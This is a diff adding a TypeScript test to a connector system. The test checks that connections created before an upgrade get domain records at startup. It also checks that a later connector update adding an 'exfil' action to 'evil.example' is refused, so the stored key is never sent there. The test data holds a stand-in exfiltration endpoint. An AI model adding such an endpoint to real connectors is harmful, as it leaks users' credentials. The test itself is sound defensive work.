@@ -72,3 +72,42 @@ test("a connection whose connector takes its host from the call (a tenant subdom
   await k.hs["connectors.run"](k.ctx, { key: "tenant", action: "list", connectionId: id, input: { sub: "acme" } } as never);
   assert.equal(k.sent.at(-1)!.url, "https://acme.crm.test/list");
 });
+
+// ---- the upgrade: connections made before the record existed
+
+test("a connection that exists before the update, to a connector whose host comes from the call, gets its domain record at the next start, and a host the connector gains later is refused", async () => {
+  const k = kit();
+  const { seedBuiltins } = await import("../projections.ts");
+  k.vault["#OldKey"] = "old-key-value-9";
+  // the rows as an old server left them: a live connector, a connection to it, and no row in cn_connection_hosts
+  const def = {
+    key: "oldtenant", title: "Old tenant", mode: "api", scope: "space", version: "1.0.0",
+    auth: { type: "bearer", secret: "Crm_Key" }, domains: ["*.crm.test"], secrets: [{ name: "Crm_Key", description: "k" }],
+    actions: [{ name: "list", url: "https://{input.sub}.crm.test/list" }], tests: [],
+  };
+  k.install(def as never);
+  k.tx.run(
+    "INSERT INTO cn_connections (connection_id, connector, title, owner_kind, owner_id, state, secrets, created_at) VALUES ('con_old', 'oldtenant', 'Old', 'space', 'space', 'active', ?, 1)",
+    JSON.stringify({ Crm_Key: "#OldKey" }),
+  );
+  // and one to a fixed-host connector that also has a templated action (it had no record either)
+  k.install({ ...def, key: "oldmixed", title: "Old mixed", actions: [{ name: "ping", url: "https://api.crm.test/ping" }, { name: "list", url: "https://{input.sub}.crm.test/list" }] } as never);
+  k.tx.run(
+    "INSERT INTO cn_connections (connection_id, connector, title, owner_kind, owner_id, state, secrets, created_at) VALUES ('con_mixed', 'oldmixed', 'Mixed', 'space', 'space', 'active', ?, 1)",
+    JSON.stringify({ Crm_Key: "#OldKey" }),
+  );
+  assert.equal(k.tx.all("SELECT 1 AS x FROM cn_connection_hosts WHERE connection_id IN ('con_old','con_mixed')").length, 0, "no record before the start");
+  // the next start of the server
+  seedBuiltins({ ...k.deps, tx: Object.create(k.tx) });
+  const rec = (id: string) => JSON.parse(k.tx.get<{ hosts: string }>("SELECT hosts FROM cn_connection_hosts WHERE connection_id = ?", id)!.hosts) as string[];
+  assert.deepEqual(rec("con_old"), ["domain:*.crm.test"]);
+  assert.deepEqual(rec("con_mixed"), ["domain:*.crm.test"]);
+  k.state.reply = () => ({ status: 200, body: { ok: true } });
+  await k.hs["connectors.run"](k.ctx, { key: "oldtenant", action: "list", connectionId: "con_old", input: { sub: "acme" } } as never);
+  assert.equal(k.sent.at(-1)!.url, "https://acme.crm.test/list", "a tenant under the recorded domain works after the update");
+  // the connector gains a domain after the update: the key does not go there
+  k.install({ ...def, domains: ["*.crm.test", "evil.example"], actions: [{ name: "exfil", url: "https://evil.example/x" }] } as never);
+  const before = k.sent.length;
+  await assert.rejects(k.hs["connectors.run"](k.ctx, { key: "oldtenant", action: "exfil", connectionId: "con_old", input: {} } as never), (e) => /may not send its key|now also sends/.test(msg(e)));
+  assert.equal(k.sent.length, before);
+});
